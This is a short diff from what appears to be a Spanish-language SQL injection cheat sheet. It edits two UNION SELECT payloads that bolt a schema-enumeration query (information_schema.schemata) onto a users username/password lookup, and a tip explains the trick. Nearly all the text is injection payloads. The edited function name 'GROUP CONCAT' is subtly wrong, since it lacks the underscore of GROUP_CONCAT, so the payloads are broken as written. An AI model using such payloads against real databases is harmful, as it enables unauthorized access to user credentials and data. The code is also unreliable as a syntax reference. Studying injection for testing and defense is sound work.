@@ -124,10 +124,10 @@ select username,password from users where username = 'F0n3' UNION SELECT 1,schem
 ##     Tip: básicamente se inserta el query de union select un "GROUP CONCAT" (GROUP CONCAT(schema_name)) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)
 
 ## Basic Union Select (v1)
-SELECT username,password FROM users UNION SELECT 1,group concat(schema_name) FROM information_schema.schemata;
+SELECT username,password FROM users UNION SELECT 1,GROUP CONCAT(schema_name) FROM information_schema.schemata;
 
 ## Condition Union Select (v2):
-select username,password from users where username = 'F0n3' UNION SELECT 1,group concat(schema_name) FROM information_schema.schemata;
+select username,password from users where username = 'F0n3' UNION SELECT 1,GROUP CONCAT(schema_name) FROM information_schema.schemata;
 ````
 
 
